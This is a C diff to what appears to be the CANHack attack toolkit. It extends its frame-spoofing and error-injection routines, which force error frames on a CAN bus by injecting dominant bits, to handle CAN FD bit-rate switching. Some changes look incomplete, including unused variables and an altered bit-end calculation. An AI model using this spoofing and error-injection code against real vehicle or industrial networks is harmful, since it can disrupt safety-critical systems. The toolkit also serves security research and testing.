@@ -450,10 +450,12 @@ TIME_CRITICAL bool canhack_spoof_frame(bool janus, ctr_t sync_time, ctr_t split_
 TIME_CRITICAL bool canhack_spoof_frame_error_passive(uint32_t loopback_offset)
 {
     uint32_t prev_rx = 1U;
+    uint32_t short_rx = 0;
     struct canhack *canhack_p = &canhack;
     uint64_t bitstream = 0;
     uint64_t bitstream_mask = canhack_p->attack_parameters.bitstream_mask;
     uint64_t bitstream_match = canhack_p->attack_parameters.bitstream_match;
+    uint64_t brs_over_match = 0x3f; //after 6 equal bits bit stuffing rules would be violated -> fast data is over
 
     uint8_t rx;
     RESET_CLOCK(0);
@@ -493,6 +495,9 @@ TIME_CRITICAL bool canhack_error_attack(uint32_t repeat, bool inject_error, uint
     uint64_t bitstream64 = 0;
     uint64_t bitstream64_mask = canhack_p->attack_parameters.bitstream_mask;
     uint64_t bitstream64_match = canhack_p->attack_parameters.bitstream_match;
+    bool brs = canhack_p->can_frame1.brs;
+    uint64_t eof_mask_brs = eof_mask << 2;
+    uint64_t eof_match_brs = eof_match << 2;
 
     uint8_t rx;
     RESET_CLOCK(0);
@@ -551,19 +556,27 @@ TIME_CRITICAL bool canhack_error_attack(uint32_t repeat, bool inject_error, uint
 
     // Now wait for error delimiter / IFS point to inject a bit one or more times
     uint32_t bitstream32 = 0;
+    uint32_t cur_sample_point_offset = SAMPLE_POINT_OFFSET;
+    uint32_t cur_bit_time = BIT_TIME;
 
     for (uint32_t i = 0; i < repeat; i++) {
+        if (brs && !inject_error) {
+            cur_sample_point_offset = SAMPLE_POINT_OFFSET_FD;
+            cur_bit_time = BIT_TIME_FD;
+            eof_mask = eof_mask_brs;
+            eof_match = eof_match_brs;
+        }
         for (;;) {
             now = GET_CLOCK();
             rx = GET_CAN_RX();
             if (prev_rx && !rx) {
                 RESET_CLOCK(FALLING_EDGE_RECALIBRATE);
-                sample_point = SAMPLE_POINT_OFFSET;
+                sample_point = cur_sample_point_offset;
             }
             else if (REACHED(now, sample_point)) {
                 bitstream32 = (bitstream32 << 1U) | rx;
-                bit_end = sample_point + SAMPLE_TO_BIT_END;
-                sample_point = ADVANCE(sample_point, BIT_TIME);
+                bit_end = sample_point + cur_sample_point_offset;
+                sample_point = ADVANCE(sample_point, cur_bit_time);
                 if ((bitstream32 & eof_mask) == eof_match) {
                     // Inject six dominant bits to ensure an error frame is handled (in case all other devices are
                     // error passive and do not signal active error frames)
@@ -837,7 +850,7 @@ void canhack_set_frame(uint32_t id_a, uint32_t id_b, bool rtr, bool ide, uint32_
     if (fd) {
         add_bit(1U, frame, dlc);
     } 
-    else {
+    else if (ide){
         add_bit(0, frame, dlc);
     }
 
